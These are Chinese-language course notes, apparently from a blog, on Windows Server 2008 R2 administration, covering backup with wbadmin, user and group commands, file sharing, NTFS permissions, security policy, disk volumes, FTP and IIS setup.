-<h6 id="（一）、安装条件"><a href="#（一）、安装条件" class="headerlink" title="（一）、安装条件"></a>（一）、安装条件</h6><p>1、CPU的主频     32位系统 1GHz      64位系统  1.4GHz<br>2、内存           32位系统  1G       64位系统   2G</p>
-<p>3、系统盘容量32位系统  16G      64位系统   20G</p>
-<h6 id="（二）、安装方式"><a href="#（二）、安装方式" class="headerlink" title="（二）、安装方式"></a>（二）、安装方式</h6><p>1、全新安装安装后是该计算机上唯一的系统，不会保留系统分区<br>2、升级安装只能由Windows  Vista  版本升级到Windows 7<br>3、双引导安装装两个系统，注意：先安装低版本，再安装高版本</p>
-<hr>
-<p>注意事项：<br>USB3.0   数据的理论传输速度达到5GB/s ，是USB2.0的10倍</p>
-<hr>
-<h4 id="一-Windows-Server-Backup使用注意事项："><a href="#一-Windows-Server-Backup使用注意事项：" class="headerlink" title="一.Windows Server Backup使用注意事项："></a>一.Windows Server Backup使用注意事项：</h4><p>​     需要一个单独的专用磁盘运行计划备份<br>​      只能备份本地磁盘上 NTFS 格式的卷<br>​     不能备份到磁带<br>​     不能恢复由 Ntbackup.exe 创建的备份</p>
-<h4 id="二、添加Windows-Server-Backup功能"><a href="#二、添加Windows-Server-Backup功能" class="headerlink" title="二、添加Windows Server Backup功能"></a>二、添加Windows Server Backup功能</h4><p>​        图形化界面工具<br>​        命令行工具</p>
-<h4 id="三、备份方式："><a href="#三、备份方式：" class="headerlink" title="三、备份方式："></a>三、备份方式：</h4><p>​       1.一次性备份<br>​       2.备份计划<br>​          周期性进行<br>​          减小工作量</p>
-<h4 id="四、备份类型："><a href="#四、备份类型：" class="headerlink" title="四、备份类型："></a>四、备份类型：</h4><p>​         1.整个服务器备份<br>​         2.自定义备份</p>
-<h4 id="五、备份方式设置："><a href="#五、备份方式设置：" class="headerlink" title="五、备份方式设置："></a>五、备份方式设置：</h4><p>​         1.始终执行完整备份<br>​              所选数据全部备份<br>​               耗时较长<br>​         2.始终执行增量备份<br>​               只备份新添加或有改动的数据<br>​               备份速度快<br>​               降低系统整体性能损耗<br>​        3.自定义备份设置<br>​             针对不同磁盘选择不同的备份方式</p>
-<h4 id="六、一次性备份（控制台备份和命令行备份）"><a href="#六、一次性备份（控制台备份和命令行备份）" class="headerlink" title="六、一次性备份（控制台备份和命令行备份）"></a>六、一次性备份（控制台备份和命令行备份）</h4><pre><code>1.一次性备份（命令行）
- wbadmin start backup -backuptarget :f: -include:d:   ----将D盘的数据备份到F盘
-2.一次性还原（命令行还原）
-get versions  -----查看备份
-wbadmin start recovery -version:10/09/2018-02:14 -itemtype:file -items:e:\aa.txt -recoverytarget:e:\-----将E盘的指定文件aa.txt恢复到E;
-wbadmin start recovery -version:10/09/2018-02:14 -itemtype:volume -items:e: -----将整个e盘的数据恢复到e盘
--itemtype: -----还原对象类型
-对象类型包括三个：APP（程序） FILE（文件） VOLUME（卷）</code></pre><h4 id="七、计划备份"><a href="#七、计划备份" class="headerlink" title="七、计划备份"></a>七、计划备份</h4><p>​       1.控制台计划备份<br>​        2.计划任务备份<br>​             1.创建命令执行脚本（.bat）<br>​             wbadmin start backup -backuptarget:f: -include:e: -quiet<br>​             2.创建计划任务触发脚本<br>​              开始—-管理工具—-任务计划工具（触发器、操作）</p>
-<hr>
-<h2 id="第三章-Windows-的用户管理"><a href="#第三章-Windows-的用户管理" class="headerlink" title="第三章   Windows  的用户管理"></a>第三章   Windows  的用户管理</h2><h4 id="本章结构-1"><a href="#本章结构-1" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、用户管理<br>二、组的管理<br>具体知识点</p>
-<h4 id="一、用户的管理"><a href="#一、用户的管理" class="headerlink" title="一、用户的管理"></a>一、用户的管理</h4><h6 id="（一）、SID"><a href="#（一）、SID" class="headerlink" title="（一）、SID"></a>（一）、SID</h6><p>1、定义：每个用户账户拥有唯一的安全标识符，用来记录用户的权限<br>2、组成：  Windows ID  +  用户的相对ID组成<br> Windows  ID ：在安装Windows 的过程每台计算机都会产生不同的Windows  ID<br>相对ID： 500 是Administrator 账户的相对ID ；新建的第一个用户是1000，第二个是1001，依次类推。</p>
-<h6 id="（二）、创建账户"><a href="#（二）、创建账户" class="headerlink" title="（二）、创建账户"></a>（二）、创建账户</h6><h6 id="（三）、账户的分类"><a href="#（三）、账户的分类" class="headerlink" title="（三）、账户的分类"></a>（三）、账户的分类</h6><p>1、与使用者相关联的账户<br>1）、Administrator   默认管理员账户    （使用者中权限最高）<br>2）、Guest  账户    访客使用          （默认禁用）</p>
-<p>2、与Windows 组件关联的账户<br>1）、SYSTEM    本地系统账户；为Windows 核心组件访问文件提供权限   （拥有高于Administrator的权限）<br>2）、Local  Service  （本地服务） 为一部分服务提供访问系统权限  ；权限和Users一致<br>3）、Network  Service （网络服务）</p>
-<h4 id="二、组的管理"><a href="#二、组的管理" class="headerlink" title="二、组的管理"></a>二、组的管理</h4><p>作用：一些账户的集合，为“组”设置权限后，隶属于该组的账户默认具有这些权限，方便管理</p>
-<h6 id="（一）、需要人为添加成员的组"><a href="#（一）、需要人为添加成员的组" class="headerlink" title="（一）、需要人为添加成员的组"></a>（一）、需要人为添加成员的组</h6><p>1、Administrators 组  默认管理员组  （可以将账户加入改组让用户具有管理员权限）<br>2、Guests  默认来宾组<br>3、Power  Users  Windows Server 2008上为向下兼容保留的组  （不再使用）<br>4、Users   新用户的默认组</p>
-<h6 id="（二）、动态包含成员的组"><a href="#（二）、动态包含成员的组" class="headerlink" title="（二）、动态包含成员的组"></a>（二）、动态包含成员的组</h6><p>1、INTERACTIVE   默认包含在本地登录的账户<br>2、Authenticated  Users   包含了通过验证的所有账户<br>3、Everyone  所有账户  （设置开放权限时使用） </p>
-<p>命令配置用户<br>命令创建用户<br>Net uer 用户名 密码 /add<br>例如：net user zhangsan 123.com /add —–创建用户zhangsan密码为123.com</p>
-<p>命令删除用户<br>Net user 用户名 /del<br>例如：net user zhangsan /del ——-删除zhangsan用户<br>命令重置用户密码<br>Net user 用户名 “”<br>例如：net user zhangsan “” —–将zhangsan用户密码重置位空<br>查看用户<br>Net user<br>将用户假如指定组<br>Net localgroup 组名 用户名 /add<br>例如：net localgroup administrator zhangsan /add—将zhangsanj加入administrator管理组<br>命令配置组<br>命令创建组<br>Net localgroup 组名  /add<br>Net localgroup jishubu /add —–创建jishubu组<br>命令删除组<br>Net localgroup jishubu /del<br>命令添加用户到指定组<br>Net localgroup 组名 用户名 /add<br>例如：net localgroup administrator zhangsan /add—将zhangsanj加入administrator管理组</p>
-<hr>
-<h2 id="文件服务"><a href="#文件服务" class="headerlink" title="文件服务"></a>文件服务</h2><h4 id="本章结构-2"><a href="#本章结构-2" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、共享文件夹<br>二、文件服务器及其策略<br>具体知识点</p>
-<h4 id="一、共享文件夹"><a href="#一、共享文件夹" class="headerlink" title="一、共享文件夹"></a>一、共享文件夹</h4><h6 id="（一）、定义：将存储在计算机上的文件夹及其中文件通过网络提供给其他计算机上操作的人。"><a href="#（一）、定义：将存储在计算机上的文件夹及其中文件通过网络提供给其他计算机上操作的人。" class="headerlink" title="（一）、定义：将存储在计算机上的文件夹及其中文件通过网络提供给其他计算机上操作的人。"></a>（一）、定义：将存储在计算机上的文件夹及其中文件通过网络提供给其他计算机上操作的人。</h6><h6 id="（二）、访问共享文件夹"><a href="#（二）、访问共享文件夹" class="headerlink" title="（二）、访问共享文件夹"></a>（二）、访问共享文件夹</h6><p>1、UNC路径  ：   \对方的IP地址（主机名）\共享名<br>  （需要输入对方电脑上的一个用户及密码）<br>2、创建共享的用户： 只能是Administrators组成员<br>3、隐藏共享：在创建共享夹时共享名后加”$”<br>访问方式：\服务器主机名或IP地址\共享名<br>4、默认共享：Windows 默认创建分区的共享，访问这些默认共享需要administrator账户身份</p>
-<h4 id="二、文件服务器"><a href="#二、文件服务器" class="headerlink" title="二、文件服务器"></a>二、文件服务器</h4><h6 id="（一）、两种网络结构"><a href="#（一）、两种网络结构" class="headerlink" title="（一）、两种网络结构"></a>（一）、两种网络结构</h6><p>1、对等网：所有的机器都需要创建相同的用户名和密码；实现彼此访问共享文件夹<br>缺点：不适合大型网络，共享文件夹分散<br>2、C/S结构：网络中提供文件资源的集中存储和访问，实现：集中化管理、内容控制、高可靠性、便捷的搜索服务。</p>
-<h6 id="（二）、文件服务器的角色服务"><a href="#（二）、文件服务器的角色服务" class="headerlink" title="（二）、文件服务器的角色服务"></a>（二）、文件服务器的角色服务</h6><p>1、共享和存储管理    为共享文件夹和存储资源提供简化管理<br>2、分布式文件系统（ DF S）：两种技术：D F S命名空间和D F S复制技术<br>DFS 命名空间可以使用户从一个入口访问位于多台计算机上的共享资源<br>3、文件服务器资源管理器  ：实现文件夹和卷的配额，主动屏蔽文件<br>4、网络文件系统服务（NF S）：实现Windows 和Unix 混合环境的文件共享解决方案<br>5、Windows 搜索服务：是Windows  Server  2008上一种新型索引解决方案</p>
-<h6 id="（三）、服务器的策略管理"><a href="#（三）、服务器的策略管理" class="headerlink" title="（三）、服务器的策略管理"></a>（三）、服务器的策略管理</h6><p>1、拒绝从网络访问  （可以实现某些特殊用户通过网络访问服务器）<br>2、本地账户的共享安全模型   （实现强制网络访问者以来宾身份访问文件服务器）<br>注意：文件服务器上要启用来宾账户<br>3、使用空白密码的本地账户只允许进行控制台登录   （实现服务器中没有设置密码的账户不被冒用，针对administrator账户）<br>禁用 选项    说明administrator 账户不能登录（空密码）<br>启用选项     说明administrator 账户能登录   （空密码）<br>4、密码保护共享   （启用，要求文件服务器和客户端必须拥有相同的用户名和密码才能访问）</p>
-<h6 id="（四）、共享权限"><a href="#（四）、共享权限" class="headerlink" title="（四）、共享权限"></a>（四）、共享权限</h6><p>1、网络访问     共享权限和NTFS权限的交集  （拒绝权限大于一切）<br>2、本地访问     只看NTF S权限（唯一生效NTFS权限）</p>
-<hr>
-<h2 id="NTFS权限"><a href="#NTFS权限" class="headerlink" title="NTFS权限"></a>NTFS权限</h2><h4 id="本章结构-3"><a href="#本章结构-3" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、理解NTFS权限<br>二、掌握NTFS权限的设置方法<br>具体知识点</p>
-<h4 id="一、NTFS权限"><a href="#一、NTFS权限" class="headerlink" title="一、NTFS权限"></a>一、NTFS权限</h4><h6 id="（一）、文件系统"><a href="#（一）、文件系统" class="headerlink" title="（一）、文件系统"></a>（一）、文件系统</h6><p>1、定义：在外部的存储设备上（硬盘）管理组织存储文件的一种方法—–存储设备（U盘 硬盘 移动硬盘）没有文件系统是无法存储数据的，相当于电脑没有操作系统无法操作。<br>2、常见的文件系统 ：FAT  简单文件存储（FAT 16 、FAT32，无安全性）<br>                    NTFS  新型文件传输系统（有安全性）<br>                    EXT    （EXT3 ，EXT4  Linux系统下）<br>3、权限：理解一种权利，只有拥有权限才能对文件进行修改、删除、等操作</p>
-<h6 id="（二）、NTFS文件系统的新功能"><a href="#（二）、NTFS文件系统的新功能" class="headerlink" title="（二）、NTFS文件系统的新功能"></a>（二）、NTFS文件系统的新功能</h6><p>1、访问控制列表     （限定用户和组对文件或文件夹具有如何操作权限）<br>2、加密文件系统<br>3、压缩<br>4、磁盘配额   限定用户最大使用磁盘空间，保证磁盘的高效利用<br>二、权限的设置及规则<br>1、权限不冲突时累加    用户同时属于多个组，如果权限不冲突，该用户拥有所有组权限之和<br>2、权限冲突时，拒绝优先<br>3、默认继承权限   文件夹的权限默认会被其子文件夹和子<br>文件继承<br>1）阻止继承（在子文件夹和文件上操作）<br>2）强制生效（父级文件夹上操作）                     </p>
-<p>a、读取权限     读取访问控制列表的权限<br>4、特别的权限  b、更改权限     更改访问控制列表的权限（建立在读取权限基础上）<br>                  c、取得所有权     默认情况下文件的创建者就     是其所有者，拥有完全控制权限  </p>
-<hr>
-<h2 id="本地安全策略"><a href="#本地安全策略" class="headerlink" title="本地安全策略"></a>本地安全策略</h2><h4 id="本章结构-4"><a href="#本章结构-4" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、账户策略的配置<br>二、本地策略的配置<br>具体知识点</p>
-<h4 id="账户策略的配置"><a href="#账户策略的配置" class="headerlink" title="账户策略的配置"></a>账户策略的配置</h4><h6 id="（一）、本地安全策略的定义：影响当前计算机的安全设置，用户登录后会受安全策略的控制"><a href="#（一）、本地安全策略的定义：影响当前计算机的安全设置，用户登录后会受安全策略的控制" class="headerlink" title="（一）、本地安全策略的定义：影响当前计算机的安全设置，用户登录后会受安全策略的控制"></a>（一）、本地安全策略的定义：影响当前计算机的安全设置，用户登录后会受安全策略的控制</h6><h6 id="（二）、打开本地安全策略管理控制台："><a href="#（二）、打开本地安全策略管理控制台：" class="headerlink" title="（二）、打开本地安全策略管理控制台："></a>（二）、打开本地安全策略管理控制台：</h6><p>1、图形化： 开始\控制面板\系统和安全\管理工具\本地安全策略<br>2、命令：secpol.msc</p>
-<h6 id="（三）、账户策略"><a href="#（三）、账户策略" class="headerlink" title="（三）、账户策略"></a>（三）、账户策略</h6><p>1、作用：通过设置密码策略和账户锁定策略来提高用户的密码安全级别<br>2、包含：密码策略和账户锁定策略</p>
-<h6 id="（四）、密码策略"><a href="#（四）、密码策略" class="headerlink" title="（四）、密码策略"></a>（四）、密码策略</h6><p>1、密码复杂性要求   （包含4类字符中的三种）<br>2、密码长度最小值    （如果设为0代表可不设置密码；最大为14）<br>3、密码最短使用期限   （0<del>998之间；设置为0 代表可随时更改密码）（对Administrator不生效）<br>4、密码最长使用期限    （0</del>999天之间，默认42天，代表一个密码用42天后必须更改密码；设置为0代表密码永不过期）<br>5、强制密码历史    （代表最近使用的几次密码不可以被使用；范围0~24；0代表可随意使用过去使用的密码）<br>6、用可还原的加密存储密码   （一种密码的加密方式，默认设置为禁用，更安全）</p>
-<h6 id="（五）、账户锁定策略"><a href="#（五）、账户锁定策略" class="headerlink" title="（五）、账户锁定策略"></a>（五）、账户锁定策略</h6><p>1、账户锁定阈值    （代表用户连续输错 密码次数等于阈值后该账户被锁定；范围0<del>999；设置为0代表该账户永不锁定）<br>2、账户锁定时间    （代表该账户被锁定后，多长时间自动解锁；范围0</del>99999分钟；设置为代表永远被锁定，只能由管理员手动解锁）<br>3、重置账户锁定计数器  （用户在该计数器时间内只要输错次数不到锁定阈值，该账户不被锁定，过此时间后又有相同的输错次数；设置范围小于或等于账户锁定时间）<br>注意：账户锁定策略对管理员账户完全不生效</p>
-<h4 id="二、本地策略"><a href="#二、本地策略" class="headerlink" title="二、本地策略"></a>二、本地策略</h4><h6 id="（一）、三部分内容"><a href="#（一）、三部分内容" class="headerlink" title="（一）、三部分内容"></a>（一）、三部分内容</h6><p>1、审核策略    2、用户权限分配    3、安全选项</p>
-<h6 id="（二）、审核策略"><a href="#（二）、审核策略" class="headerlink" title="（二）、审核策略"></a>（二）、审核策略</h6><p>作用：确定是否将计算机与安全有关的事件记录到安全日志中，也可将用户成功或者失败的登录记录在日志中等<br>事件查看器：用于浏览和管理事件日志</p>
-<h6 id="（三）、用户权限分配"><a href="#（三）、用户权限分配" class="headerlink" title="（三）、用户权限分配"></a>（三）、用户权限分配</h6><p>作用：可以对某些特定的用户和组授予或拒绝一些特殊的权限<br>常用设置：<br>关闭系统<br>更改系统时间<br>拒绝本地登录<br>拒绝从网络访问这台计算机<br>允许通过远程桌面服务登陆</p>
-<h6 id="（三）、安全选项"><a href="#（三）、安全选项" class="headerlink" title="（三）、安全选项"></a>（三）、安全选项</h6><p>作用：控制一些和操作系统安全相关的设置<br>常用设置：<br>交互式登陆-登陆时不显示用户名<br>交互式登陆-试图登陆的用户的消息标题<br>交互式登陆-试图登陆的用户的消息文本<br>网络访问-本地账户的共享和安全模型<br>账户-使用空白密码的账户只允许控制台登陆</p>
-<p>注意：更新策略的命令  ：  gpupdate</p>
-<h6 id="（四）、本地组策略-（一组策略的集合，在工作组环境没有在域环境应用广泛）"><a href="#（四）、本地组策略-（一组策略的集合，在工作组环境没有在域环境应用广泛）" class="headerlink" title="（四）、本地组策略   （一组策略的集合，在工作组环境没有在域环境应用广泛）"></a>（四）、本地组策略   （一组策略的集合，在工作组环境没有在域环境应用广泛）</h6><p>打开管理控制台的命令：  gpedit.msc</p>
-<hr>
-<h2 id="Windows-磁盘管理"><a href="#Windows-磁盘管理" class="headerlink" title="Windows 磁盘管理"></a>Windows 磁盘管理</h2><h4 id="本章结构-5"><a href="#本章结构-5" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、磁盘管理概述<br>二、Windows 动态磁盘管理<br>具体知识点</p>
-<h4 id="一、磁盘管理概述"><a href="#一、磁盘管理概述" class="headerlink" title="一、磁盘管理概述"></a>一、磁盘管理概述</h4><h6 id="（一）、分区方式"><a href="#（一）、分区方式" class="headerlink" title="（一）、分区方式"></a>（一）、分区方式</h6><p>1、MBR 分区方式 ：主启动记录；包含引导程序和分区表（64字节）；每个分区信息会占16个字节；最多可划分4个主分区；<br>注意：如果想划分超过4个分区，第四个主分区会变成扩展分区，然后在扩展分区上再去划分逻辑分区<br>2、GPT的分区方式：分区表突破64字节；Windows 2008上最多可划分128个主分区</p>
-<h6 id="（二）、基本磁盘"><a href="#（二）、基本磁盘" class="headerlink" title="（二）、基本磁盘"></a>（二）、基本磁盘</h6><p>1、只能管理连续的磁盘空间<br>2、不能提高读写效率<br>3、无可靠性</p>
-<h6 id="（三）、动态磁盘"><a href="#（三）、动态磁盘" class="headerlink" title="（三）、动态磁盘"></a>（三）、动态磁盘</h6><p>1、可扩展性    （随时扩展文件系统的管理空间，即分区的容量）<br>2、高读写性    （动态磁盘中卷由多个硬盘组成，提高读写的速率）<br>3、高可靠性     （防止某个硬盘损坏导致数据丢失）</p>
-<h6 id="二、Windows-动态磁盘卷管理"><a href="#二、Windows-动态磁盘卷管理" class="headerlink" title="二、Windows 动态磁盘卷管理"></a>二、Windows 动态磁盘卷管理</h6><p>（一）、联机    只有联机硬盘才能初始化使用<br>（二）、初始化    选择两种分区方式的一种<br>（三）、新建卷的过程  （首先需要把基本磁盘转换为动态磁盘）</p>
-<p>1、简单卷  （条件：如果存一个比较大的文件放不下        跨区）</p>
-<p>2、跨区卷   （至少2块硬盘，写满一个再写下一块硬盘，无法提高效率       带区）</p>
-<p>3、带区卷   （数据会同时往N个硬盘上写，速率最快，但不能容错       镜像）</p>
-<p>4、镜像卷    （能实现容错，但损失磁盘利用率，不能提升读写速率       RAID-5卷）<br>5、RAID卷   （既能容错、也能提高读写速率）</p>
-<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>卷类型 需要磁盘数 每个磁盘提供的空间是否一致 可扩展性 读写性能 容错 空间利用率<br>简单卷 1 —— 可 正常 无 100%<br>跨区卷 2<del>32 不一致 可 正常 无 100%<br>带区卷 2</del>32 一致 否 最快 无 100%<br>镜像卷 只能是2个 一致 否 正常 有 50%<br>RAID-5卷 3~32 一致 否 较快 有 n-1</p>
-<h6 id="（四）、管理卷"><a href="#（四）、管理卷" class="headerlink" title="（四）、管理卷"></a>（四）、管理卷</h6><p>1、扩展性     （在简单卷和跨区卷上实现，只要不是系统盘就可扩展，如果跨到其他硬盘简单卷会变成跨区卷）<br>2、压缩卷<br>3、添加镜像   （简单卷添加镜像会变成镜像卷）<br>4、删除镜像    （镜像卷删除镜像后会变成简单卷）<br>5、中断镜像     （镜像卷会变成两个简单卷）<br>6、RAID-5卷     （最多只能损坏一块硬盘，可通过修复卷修复该RAID-5卷）</p>
-<hr>
-<h2 id="部署DHCP服务"><a href="#部署DHCP服务" class="headerlink" title="部署DHCP服务"></a>部署DHCP服务</h2><h2 id="FTP服务"><a href="#FTP服务" class="headerlink" title="FTP服务"></a>FTP服务</h2><h4 id="本章结构-6"><a href="#本章结构-6" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、FTP的客户端<br>二、FTP服务器</p>
-<h4 id="具体知识点-1"><a href="#具体知识点-1" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、FTP客户端"><a href="#一、FTP客户端" class="headerlink" title="一、FTP客户端"></a>一、FTP客户端</h4><h6 id="（一）、FTP定义"><a href="#（一）、FTP定义" class="headerlink" title="（一）、FTP定义"></a>（一）、FTP定义</h6><p>是一种应用层协议，称文件传输协议，主要能实现用户的上传和下载功能；采用C/S结构进行管理</p>
-<h6 id="（二）、常见的FTP客户端"><a href="#（二）、常见的FTP客户端" class="headerlink" title="（二）、常见的FTP客户端"></a>（二）、常见的FTP客户端</h6><p>1、WWW浏览器访问      （最常用）<br>2、命令行工具<br>具体操作方法：<br>a、登录FTP服务器      命令提示符 输入   ：  ftp   FTP服务器的IP地址<br>b、输入用户名      直接输入     （提示信息：以数字2或3的百位数说明登录成功；以5开头的百位数代表登录失败）<br>c、输入密码      （不显示密码）<br>d、显示文件列表      l s  （简单显示）  或  dir  （详细显示）<br>e、进入文件夹        c d   文件夹名<br>f、 后退一步          cd  . .<br>g、下载文件           get    文件名    （默认所在的下载位置是当前登录账户所在的文件夹内）<br>h、上传文件           put    文件名    （默认要把需要 上传的文件放在当前登录账户的文件夹内）<br>i、删除文件            del    文件名<br>j、退出登录            bye<br>3、专用图形工具<br>FileZilla   ；   CuteFTP  ；   FlashFXP；  LeapFTP</p>
-<h4 id="二、FTP服务器"><a href="#二、FTP服务器" class="headerlink" title="二、FTP服务器"></a>二、FTP服务器</h4><h6 id="（一）、在Windows-Server2008上搭建FTP服务器"><a href="#（一）、在Windows-Server2008上搭建FTP服务器" class="headerlink" title="（一）、在Windows  Server2008上搭建FTP服务器"></a>（一）、在Windows  Server2008上搭建FTP服务器</h6><p>1、需要在角色中/添加角色/Web服务器（IIS）/添加必须的功能/勾选上FTP服务/安装<br>2、启动FTP站点   （默认生成一个站点（可删也可保留）默认主目录：C:\inetpub\ftproot）<br>3、权限：用户的访问权限是NTFS权限和FTP权限的交集<br>4、匿名账户：anonymous 和 ftp</p>
-<h6 id="（二）、Serv-U"><a href="#（二）、Serv-U" class="headerlink" title="（二）、Serv-U"></a>（二）、Serv-U</h6><p>定义：是一款软件，可以将任何计算机变成FTP服务器</p>
-<h6 id="（三）、常见的FTP服务端"><a href="#（三）、常见的FTP服务端" class="headerlink" title="（三）、常见的FTP服务端"></a>（三）、常见的FTP服务端</h6><p>Xlight  ftp Server  ；  RaidenFTPD ； EFT  Server  ；FileZilla  Server</p>
-<hr>
-<h2 id="部署web服务"><a href="#部署web服务" class="headerlink" title="部署web服务"></a>部署web服务</h2><h2 id="部署DNS服务"><a href="#部署DNS服务" class="headerlink" title="部署DNS服务"></a>部署DNS服务</h2><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h4 id="WWW服务"><a href="#WWW服务" class="headerlink" title="WWW服务"></a>WWW服务</h4><p>www(word wide web)—万维网服务，其实现形式是通过web站点。</p>
-<p>搭建WEB服务的软件：</p>
-<p>1.Apache(开源软件，多应用于Linux、Unix系统下)</p>
-<p>2.IIS（微软产品，多应用于Windows系统下）</p>
-<hr>
-<h4 id="IIS7-5"><a href="#IIS7-5" class="headerlink" title="IIS7.5"></a>IIS7.5</h4><p>与老版本对比的技术改进：</p>
-<p>\1. 集成扩展</p>
-<p>2.管理功能增强</p>
-<p>3.应用程序宿主增强</p>
-<p>4.对服务器核心版本的.net功能增强</p>
-<p>WEB站点的安装（详细步骤见课本P62-63）</p>
-<p>安装之后，在浏览器输入localhost来验证IIS是否正常工作</p>
-<p>localhost=127.0.0.1</p>
-<h4 id="WEB站点的配置"><a href="#WEB站点的配置" class="headerlink" title="WEB站点的配置"></a>WEB站点的配置</h4><h6 id="1-配置站点的IP和端口号"><a href="#1-配置站点的IP和端口号" class="headerlink" title="1.配置站点的IP和端口号"></a>1.配置站点的IP和端口号</h6><p>   @IP地址建议使用静态地址</p>
-<p>   @端口号默认是80  可以更改端口号，更改后访问格式如下：<a href="http://ip:新端口号" target="_blank" rel="noopener">http://ip:新端口号</a></p>
-<p>   @类型：http&amp;https(安全版http，加密传输的网页数据)</p>
-<h6 id="2-配置站点的物理路径和连接限制"><a href="#2-配置站点的物理路径和连接限制" class="headerlink" title="2.配置站点的物理路径和连接限制"></a>2.配置站点的物理路径和连接限制</h6><p>   @默认站点的物理路径：c:\inetpub\wwwroot(注意：出于安全考虑，此路径不要与系统在同一个分区)</p>
-<p>   @连接限制分为三种设置：</p>
-<p>​         *链接超时：默认120秒（120S之后将重新访问）</p>
-<p>​         *最大并发连接数：最大可承载的访问数（防止系统超负荷过重）</p>
-<p>​         *最大带宽：限制站点使用的网络带宽，防止web服务占用过多的网络资源，影响其他网络服务。</p>
-<h6 id="3-默认文档"><a href="#3-默认文档" class="headerlink" title="3.默认文档"></a>3.默认文档</h6><p>  服务搭建成功后在没有指定要访问网页时，用于默认想用用户的文档网页</p>
-<p>  系统已设默认文档如下：Default.htm Default.asp ,index.html,iisstart.htm</p>
-<p>  优先显示顺序：至上而下（顺序可调整）</p>
-<hr>
-<h4 id="虚拟目录"><a href="#虚拟目录" class="headerlink" title="虚拟目录"></a>虚拟目录</h4><h6 id="一、概念："><a href="#一、概念：" class="headerlink" title="一、概念："></a>一、概念：</h6><p>逻辑上网站数据（文件夹或网页）在网站站点，物理上网站数据在其他主机或是路径，防止主目录</p>
-<p>占用空间过大，导致空间不足。</p>
-<h6 id="二、虚拟目录优点："><a href="#二、虚拟目录优点：" class="headerlink" title="二、虚拟目录优点："></a>二、虚拟目录优点：</h6><p>1.将数据分散保存到不同的磁盘或是主机，便于开发维护</p>
-<p>2.数据移动到其他位置时，不会影响到weB站点的逻辑结构</p>
-<p>3.虚拟目录的物理路径即可是本地路径也可以是远程共享文件夹</p>
-<h6 id="三、创建虚拟目录—"><a href="#三、创建虚拟目录—" class="headerlink" title="三、创建虚拟目录—"></a>三、创建虚拟目录—</h6><h6 id="四、配置虚拟目录"><a href="#四、配置虚拟目录" class="headerlink" title="四、配置虚拟目录"></a>四、配置虚拟目录</h6><p>​    @可以修改物理路径，但是不能修改虚拟主机别名</p>
-<p>​    @可以设置默认文档</p>
-<p>虚拟主机—-一台服务器上运行多个网站，这些网站成为虚拟主机</p>
-<h6 id="一、实现虚拟主机的方式："><a href="#一、实现虚拟主机的方式：" class="headerlink" title="一、实现虚拟主机的方式："></a>一、实现虚拟主机的方式：</h6><p>​    1.使用不同的IP</p>
-<p>​    2.使用相同的IP的不同的端口号</p>
-<p>​    3.使用相同的IP和端口号，不同的主机名</p>
-<hr>
-<h2 id="Windows-Server-2008R2-的安装与网络配置"><a href="#Windows-Server-2008R2-的安装与网络配置" class="headerlink" title="Windows  Server  2008R2 的安装与网络配置"></a>Windows  Server  2008R2 的安装与网络配置</h2><h4 id="本章结构-7"><a href="#本章结构-7" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、Windows Server 2008R2的版本及安装<br>二、基本配置</p>
-<h4 id="具体知识点-2"><a href="#具体知识点-2" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、Windows-Server-2008的版本及安装"><a href="#一、Windows-Server-2008的版本及安装" class="headerlink" title="一、Windows Server 2008的版本及安装"></a>一、Windows Server 2008的版本及安装</h4><h6 id="（一）、Windows-Server-2008R2-的改进"><a href="#（一）、Windows-Server-2008R2-的改进" class="headerlink" title="（一）、Windows  Server  2008R2 的改进"></a>（一）、Windows  Server  2008R2 的改进</h6><p>特点：集成了更多的功能、更多的网络服务组件（新技术：Hyper-V 、Server Core 、IIS 7.0等）</p>
-<h6 id="（二）、家族成员"><a href="#（二）、家族成员" class="headerlink" title="（二）、家族成员"></a>（二）、家族成员</h6><p>版本 支持CPU 内存 环境<br>标准版（Standard） 4个CPU 32位：4GB64位：32GB 中小企业<br>企业版（Enterprise） 8个CPU 32位：64GB64位：2TB 大型企业<br>数据中心版（Datacenter） 32位：32个CPU64位：64个CPU 32位：64GB64位：2TB 超大规模企业<br>Web 版 4个CPU 32位：4GB64位：32GB 为Web应用程序服务器<br>安腾版 64个CPU 2TB 基于Itanium计算机，不支持虚拟化</p>
-<h6 id="（三）、安装企业版最低的硬件要求"><a href="#（三）、安装企业版最低的硬件要求" class="headerlink" title="（三）、安装企业版最低的硬件要求"></a>（三）、安装企业版最低的硬件要求</h6><p>1、CPU速度       32位：1GHz      64位：1.4GHz<br>2、内存           512MB<br>3、硬盘空间       最少10GB</p>
-<h6 id="（四）、安装方式"><a href="#（四）、安装方式" class="headerlink" title="（四）、安装方式"></a>（四）、安装方式</h6><p>1、完全安装         （传统安装模式，安装完成后可充当各种服务器角色）<br>2、服务器核心安装   （不安装完整的图形用户界面，减少了受攻击面和硬件资源损耗）</p>
-<h4 id="二、基本配置"><a href="#二、基本配置" class="headerlink" title="二、基本配置"></a>二、基本配置</h4><h6 id="（一）、给接口配置IP地址"><a href="#（一）、给接口配置IP地址" class="headerlink" title="（一）、给接口配置IP地址"></a>（一）、给接口配置IP地址</h6><p>1、打开命令提示符：   输入：    netsh   interface   show  interface  （查看接口名称）<br>2、配置动态获取IP地址：  netsh  interface  ip  set  address  “接口名称”  DHCP<br>3、配置静态IP地址：  netsh   interface  ip  set  address “接口名称”  static  IP地址  子网掩码    默认网关</p>
-<h6 id="（二）、自动专用IP地址"><a href="#（二）、自动专用IP地址" class="headerlink" title="（二）、自动专用IP地址"></a>（二）、自动专用IP地址</h6><p>定义：当网络中不存在DHCP服务器或DHCP服务器宕机的情况下，如果选择自动获取IP地址，会得到169.254.0.0~169.254.255.255 这个网段的地址<br>备用配置：该备用配置中的用户配置优先级高于自动专用IP地址</p>
